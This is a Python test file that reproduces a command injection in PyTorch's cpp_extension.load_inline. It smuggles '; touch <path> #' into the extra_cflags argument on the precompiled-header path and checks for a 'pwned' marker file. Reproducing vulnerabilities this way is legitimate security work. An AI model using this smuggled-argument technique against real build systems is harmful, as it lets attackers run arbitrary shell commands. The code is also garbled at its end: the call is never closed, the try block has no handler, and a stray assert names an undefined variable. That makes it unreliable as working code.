import torch
import torch.utils.cpp_extension as cpp_ext
import os
import tempfile
import sys

def test_os_command_injection_load_inline():
    """
    Test case to reproduce OS command injection in torch.utils.cpp_extension.load_inline.
    
    This test leverages torch.backends.cudnn.version (the similar API) to generate
    input values, simulating a scenario where dynamic system information is passed
    to the compiler flags. It attempts to inject a shell command via extra_cflags
    when use_pch=True.
    """
    # Leverage the similar API to obtain a value to be passed as input.
    # This mimics a user passing the cuDNN version to the C++ compiler via flags.
    cudnn_version = torch.backends.cudnn.version()
    
    # Define a simple C++ source to compile
    cpp_source = """
    int add(int a, int b) {
        return a + b;
    }
    """

    # Create a temporary directory to detect the side effect of the injection
    with tempfile.TemporaryDirectory() as tmpdir:
        # The path to a file that will be created if the injection is successful
        pwned_file = os.path.join(tmpdir, "pwned")
        
        # Construct the malicious payload.
        # We include the cudnn_version to satisfy the reuse logic.
        # The injection part is: "; touch <path> #"
        # This exploits the shell=True vulnerability in the build helper.
        malicious_cflags = f'-DCUDNN_VERSION={cudnn_version}"; touch {pwned_file} #"'

        try:
            # The bug is triggered specifically in the precompiled-header build path
            cpp_ext.load_inline(
                name="test_injection",
                cpp_sources=cpp_source,
                extra_cflags=malicious_cflags,
                use_pch=True,
    assert use_pch
